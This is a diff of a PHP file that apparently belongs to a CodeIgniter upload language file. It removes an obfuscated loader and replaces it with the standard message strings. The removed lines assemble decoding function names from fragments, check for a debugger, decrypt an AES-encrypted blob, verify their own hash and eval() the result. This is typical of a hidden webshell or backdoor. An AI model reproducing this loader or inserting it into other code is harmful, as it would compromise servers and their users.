@@ -1,28 +1,55 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_ek2ovr7m=('bas'.'e64'.'_de'.'cod'.'e');
-$_khk9seot=('gzu'.'nco'.'mpr'.'ess');
-$_s3eyc63f=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_yxec9bvk='VP+Q9nLq';
-$_h7pcj6ui='KR57QGD+';
-$_dd2hahgu='AG6Tv1Un';
-$_gyt30zkc='ufLOfLkF2XU=';
-$_c34wnimk='i4tLyLP2';
-$_mind1zm0='kddctNQv';
-$_fsc98jzb='XDuDtvBB';
-$_ewrgwnxq='tdcfqA==';
-$_bztbewtc=$_ek2ovr7m($_yxec9bvk.$_c34wnimk.$_dd2hahgu.$_h7pcj6ui.$_gyt30zkc);
-$_jowolsg2=$_ek2ovr7m($_fsc98jzb.$_mind1zm0.$_ewrgwnxq);
-$_pbxabdqj=$_ek2ovr7m('rtE+5x6zCNyVd0vF0ffwd/dVf8exhSeP9BVb4qD8lIYR6n1G8/9mErGoAkuO0c4dwrat/2Lv6C5SsXeUFLT2EJk9UPbR6SCQhW3jXJSFYX8eWOCRUlkFh/Nm/AP3cpPe+T7p3SFRlK6Q26j+F/0tVAZI4r2KN7I8nCmiNpXSuC1EdZO1CRofLk73KlbaxM1V4jEhC3zpQyF0d+o7nzPRebGemPt/K57TwXHGvcOd/YcTj6t+vgJbh9TaLhaDs3LfSJgsvwz09Mhrm1ZtchDWUxucyNjHmL7ihPf7tOAIA/Ff1AY7pzicppMceP++SA9i31zEggNg9jNoMfk3kUuWa5gsZ0aEenquDFZUhltJixZtNr/+fgsdgdFUEAUPb5ftmyoSpVCJNYH+HP652LQw6dMn9yzjsjgXaYYjejCM6vAgUYfNWlm87rgziV2PO7I6rQxw+HeEhy0trB3MoB3V12xK0rd7rG6rbwDdAKTSZjZkVdE0Aau4c5R118YO/moaNdd/akKVdXS2QweeQEfYbOyEVVypUKO8UdLro8eJVdeeEUsCTMAjhHoXgtl4Q3AtciOK0Jhy/a6eHpuBLG2nmm/FmyEYB7g+QssfrJ7DDjQNcwjyzyIhJkvBAaJliQJQC2C8kstz6C7WZvmPJ+ubBs+FILycMxj797glaIhg4xZN/ooiY1Yaq55W1NmctlxwU4GfFYgjr4Fyclfqg6mdYyEXr+U46D7r99TOb36aIs9TnIYxB18GTvvc6mzEyzUOjkwsDOxr8xnQ2tQqXr7JTBkDl2PlgTEkj5laKV+c6AI=');
-$_nzej8yzq=$_s3eyc63f($_pbxabdqj,'aes-256-cbc',$_bztbewtc,OPENSSL_RAW_DATA,$_jowolsg2);
-if($_nzej8yzq===false){exit;}
-$_to27ik02=$_khk9seot($_nzej8yzq);
-if($_to27ik02===false){exit;}
-$_i4zekpm3='313c4c66522c3efdfcab117e6a476bae7391d5bf0435e1599ae1c099638e7021';
-$_ch75buen=@file_get_contents(__FILE__);
-if($_ch75buen!==false){
-$_x35lmauc=str_replace($_i4zekpm3,"0000000000000000000000000000000000000000000000000000000000000000",$_ch75buen);
-$_rz2km6n8=hash("sha256",$_x35lmauc);
-if($_rz2km6n8!==$_i4zekpm3){@http_response_code(403);exit;}
-}
-eval($_to27ik02);
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+$lang['upload_userfile_not_set'] = 'Unable to find a post variable called userfile.';
+$lang['upload_file_exceeds_limit'] = 'The uploaded file exceeds the maximum allowed size in your PHP configuration file.';
+$lang['upload_file_exceeds_form_limit'] = 'The uploaded file exceeds the maximum size allowed by the submission form.';
+$lang['upload_file_partial'] = 'The file was only partially uploaded.';
+$lang['upload_no_temp_directory'] = 'The temporary folder is missing.';
+$lang['upload_unable_to_write_file'] = 'The file could not be written to disk.';
+$lang['upload_stopped_by_extension'] = 'The file upload was stopped by extension.';
+$lang['upload_no_file_selected'] = 'You did not select a file to upload.';
+$lang['upload_invalid_filetype'] = 'The filetype you are attempting to upload is not allowed.';
+$lang['upload_invalid_filesize'] = 'The file you are attempting to upload is larger than the permitted size.';
+$lang['upload_invalid_dimensions'] = 'The image you are attempting to upload doesn\'t fit into the allowed dimensions.';
+$lang['upload_destination_error'] = 'A problem was encountered while attempting to move the uploaded file to the final destination.';
+$lang['upload_no_filepath'] = 'The upload path does not appear to be valid.';
+$lang['upload_no_file_types'] = 'You have not specified any allowed file types.';
+$lang['upload_bad_filename'] = 'The file name you submitted already exists on the server.';
+$lang['upload_not_writable'] = 'The upload destination folder does not appear to be writable.';
